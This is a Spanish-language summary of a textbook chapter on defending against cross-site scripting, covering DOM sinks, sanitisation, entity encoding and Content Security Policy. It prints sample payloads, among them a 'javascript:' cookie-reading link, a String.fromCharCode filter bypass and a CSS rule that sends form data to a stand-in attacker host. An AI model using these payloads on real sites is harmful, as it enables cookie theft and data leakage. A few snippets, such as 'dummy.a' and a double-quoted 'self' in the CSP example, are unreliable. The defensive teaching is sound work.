# Web Application Security (2nd Edition) — Andrew Hoffman (O'Reilly Media, 2024)
## Capítulo 28 — Defending Against XSS Attacks (Defensa contra ataques XSS)

> Nota de extracción: el texto se extrajo de la capa de texto del PDF y las citas usan la página del PDF.

## Lo que necesitas saber
Tras estudiar los ataques XSS en el Capítulo 10, este capítulo se centra por completo en proteger tu código frente a ellos. Las vulnerabilidades XSS son muy frecuentes en la web y capaces de causar daño considerable, porque la ejecución de scripts tiene un amplio abanico de impacto. La buena noticia es que la mayoría del XSS es fácil de mitigar o prevenir por completo mediante buenas prácticas de codificación segura y técnicas específicas anti-XSS.

La tesis central es que el XSS más común es fácil de defender; la dificultad aparece cuando un requisito de funcionalidad obliga a mostrar datos enviados por el usuario como DOM en lugar de como texto. El XSS puede mitigarse en varios puntos del stack (red, base de datos, cliente), pero el cliente es casi siempre el punto ideal, porque un XSS requiere ejecución del lado del cliente para ser un XSS.

Sales sabiendo cómo tratar datos de usuario como strings, cómo sanitizar entradas, enlaces y HTML, qué sinks del DOM evitar, cómo funciona el entity encoding, el riesgo del XSS vía CSS, y cómo usar una Content Security Policy (CSP) como primera línea de defensa.

## Buenas prácticas de codificación anti-XSS (Anti-XSS Coding Best Practices)
La regla principal: "nunca permitas que datos de usuario sin sanitizar lleguen al DOM". Poblar el DOM con datos de usuario debe ser la opción de último recurso, no la primera. Cuando sea inevitable, hazlo como string siempre que no se requiera HTML/DOM.

Detección de tipo string en JavaScript:
```javascript
const isString = function(x) {
  if (typeof x === 'string' || x instanceof String) {
    return true;
  }
  return false;
};
```
Este check falla con números, que también son seguros para inyectar en el DOM. Los números y strings se agrupan como objetos "string-like", evaluables con un efecto colateral de `JSON.parse()`:
```javascript
const isStringLike = function(x) {
  try {
     return JSON.stringify(JSON.parse(x)) === x;
  } catch (e) {
    console.log('not string-like');
  }
};
```
Objetos complejos como funciones fallan el check porque no encajan en el formato JSON.

Al inyectar en el DOM con `innerText` vs `innerHTML`: cuando no se necesitan etiquetas HTML, `innerText` es mucho más seguro porque sanea lo que parezca una etiqueta HTML representándolo como string. `innerHTML` interpreta las etiquetas como DOM. La sanitización de `innerText` no es infalible (cada navegador tiene variaciones y existen bypasses).

## Sanitizar la entrada del usuario (Sanitizing User Input)
A veces no puedes apoyarte en `innerText`, especialmente cuando debes permitir ciertas etiquetas (`<strong>`, `<i>`) pero no otras (`<script>`). Hay que sanear exhaustivamente y bloquear intentos de escape del sanitizador.

> "la sanitización es en realidad bastante difícil. De hecho, la sanitización completa es extremadamente difícil." (PDF p. 383)

Aunque bloquees comillas y etiquetas `<script>`, sigue siendo posible ejecutar código con el pseudoesquema JavaScript (que siempre debes evitar):
```html
<a href="javascript:alert(document.cookie)">click me</a>
<a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a>
```
`String.fromCharCode()` evita incluso el filtrado de comillas. El DOM XSS es aún más difícil de mitigar por su dependencia de métodos fuera de tu control.

Todo lo que convierte texto a DOM o texto a script es un vector potencial de XSS. Evita estas APIs cuando sea posible:

- `element.innerHTML` / `element.outerHTML`
- `Blob`
- `SVG`
- `document.write` / `document.writeln`
- `DOMParser.parseFromString`
- `document.implementation`

### DOMParser Sink
`parseFromString` carga el string en nodos DOM que reflejan su estructura. Crear cada nodo manualmente con `document.createElement()` y `document.appendChild(child)` es mucho menos arriesgado: controlas estructura y nombres de etiqueta, y el payload solo controla el contenido.

### SVG Sink
Los SVG se basan en la spec XML que permite ejecución de script, por lo que son más riesgosos que otras imágenes. Pueden lanzar cualquier JavaScript `onload`, lo que los hace más peligrosos que la etiqueta `<img>` usada en CSRF.
```xml
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <circle cx="250" cy="250" r="50" fill="red" />
  <script type="text/javascript">console.log('test');</script>
</svg>
```

### Blob Sink
Los Blob almacenan datos arbitrarios y permiten ejecución de código; pueden guardar base64 como contenedor de datos arbitrarios. Mejor dejarlos fuera del código, sobre todo si su instanciación involucra datos de usuario.

## Sanitizar hipervínculos (Sanitizing Hyperlinks)
Además del pseudoesquema JavaScript, hay que sanear cualquier HTML. Se puede aprovechar el filtrado robusto que los navegadores tienen para enlaces `<a></a>` creando un elemento `<a>` ficticio:
```javascript
const goToLink = function() {
  const dummy = document.createElement('a');
  dummy.href = userLink;
  window.location.href = `https://mywebsite.com/${dummy.a}`;
};
```
La sanitización de etiquetas `<script>` en `<a></a>` está integrada en los navegadores principales. Esto además sanea el esquema permitiendo solo esquemas legales para `<a>` y evita URLs inválidas. También puede usarse `encodeURIComponent()`:
```javascript
encodeURIComponent('<strong>test</strong'); // %3Cstrong%3Etest%3C%2Fstrong%3E
```
`encodeURIComponent()` no sirve para una URL completa, porque el origen (scheme + :// + hostname + : + port) no puede interpretarse codificado (se convierte en otro origen).

## HTML Entity Encoding
Codificar las etiquetas HTML presentes en datos de usuario para que no se interpreten como JavaScript. Los "big five" (Table 28-1):

| Carácter | Entity encoded |
|----------|----------------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&#034;` |
| `'` | `&#039;` |

No cambia la lógica de visualización (`&amp;` se muestra como "&") y reduce drásticamente el riesgo de ejecución. El entity encoding NO protege contenido inyectado dentro de `<script></script>`, CSS o una URL: solo protege contenido inyectado en nodos tipo `<div></div>`.

## CSS XSS
Aunque el CSS se considera "solo visualización", la robustez de su spec lo convierte en vía alternativa de payloads XSS. Caso típico: un usuario sube una hoja de estilos para personalizar su perfil y otros usuarios la descargan al visitarlo. Cada vez que se carga una imagen de otro origen (desde HTML, JS o CSS) se emite una petición GET.

Con `background:url` se carga una imagen desde un dominio, incluyendo query params. El CSS permite estilado selectivo según el estado de un formulario, lo que filtra datos:
```css
#income[value=">100k"] {
  background:url("https://www.hacker.com/incomes?amount=gte100k");
}
```
El CSS es más difícil de sanear que JavaScript. Los ataques CSS se evitan por:

- [fácil] Prohibir CSS subido por usuarios.
- [medio] Permitir solo campos específicos y generar la hoja de estilos tú mismo en el servidor con esos campos.
- [difícil] Sanear cualquier atributo CSS que inicie HTTP (`background:url`).

## Content Security Policy para prevención de XSS
La CSP es una herramienta de configuración de seguridad soportada por todos los navegadores principales, que relaja o endurece qué tipo de código puede ejecutarse en la aplicación: qué scripts externos se cargan, desde dónde, y qué APIs del DOM pueden ejecutarlos.

### Script Source
Reducir el número de fuentes de script permitidas mitiga la ejecución de scripts no escritos por ti. La CSP permite allowlistear URLs con `script-src`:
```
Content-Security-Policy: script-src "self" https://api.mega-bank.com
```
Cargar un script desde una URL no listada (p. ej. `https://api2.mega-bank.com` o `https://www.hacker.com`) provoca un error de violación de CSP. La aplicación la impone el navegador, así que es difícil de bypassear. Soporta wildcards, pero cualquier allowlist con comodín conlleva riesgo inherente (p. ej. reutilizar `https://*.mega-bank.com` para un futuro `hosting.mega-bank.com` con scripts subidos por usuarios). `"self"` refiere a la URL actual desde la que se carga la política.

### Unsafe Eval y Unsafe Inline
`script-src` no protege contra scripts cargados desde tus propios servidores de confianza (si un atacante logra almacenar o reflejar uno). La CSP ofrece controles de mitigación: por defecto, con CSP habilitada, la ejecución de scripts inline está deshabilitada (se reactiva con `unsafe-inline`), y `eval()` y métodos string→code también (se reactiva con `unsafe-eval`).

Si dependes de `eval`, reescribe la función para que no se interprete como string:
```javascript
// más riesgoso (string -> code)
setTimeout(`window.alert(${message});`, minutes * 60 * 1000);

// más seguro
setTimeout(function() {
  alert(message);
}, minutes * 60 * 1000);
```
Cualquier función interpretada como string arriesga un escape que lleve a ejecución de código.

### Implementar una CSP
Es simplemente un string de configuración leído por el navegador. Formas comunes:

- Enviar la cabecera `Content-Security-Policy` en cada petición con la política como valor.
- Incrustar una etiqueta `<meta>` en el HTML:
```html
<meta http-equiv="Content-Security-Policy" content="script-src
      https://www.mega-bank.com;">
```
Conviene aplicar la CSP como primer paso de mitigación si ya sabes qué construcciones y APIs usará la aplicación; puede cambiarse fácilmente después.

## Ideas clave
- El XSS común es fácil de prevenir; la dificultad surge cuando hay que mostrar datos de usuario como DOM en lugar de como texto.
- Regla base: nunca pasar datos de usuario sin sanitizar al DOM; cuando sea posible, inyectarlos como string y usar `innerText` en vez de `innerHTML`.
- La sanitización completa es extremadamente difícil; cuidado con el pseudoesquema `javascript:` y con `String.fromCharCode()`.
- Evita sinks de DOM XSS: `innerHTML`/`outerHTML`, `Blob`, `SVG`, `document.write`, `DOMParser.parseFromString`, `document.implementation`.
- Para enlaces, aprovecha el filtrado nativo de `<a>` (elemento ficticio) y `encodeURIComponent()`, que no sirve para una URL completa.
- El HTML entity encoding ("big five") protege nodos tipo `<div>`, pero no contenido dentro de `<script>`, CSS ni URLs.
- El CSS puede filtrar datos vía `background:url`; la mejor defensa es prohibir CSS subido por usuarios o generarlo tú en el servidor.
- La CSP (`script-src`, `"self"`, cuidado con wildcards; `unsafe-inline` y `unsafe-eval` deshabilitados por defecto) es una gran primera medida, pero no protege contra DOM XSS. El cliente es el punto ideal de mitigación.
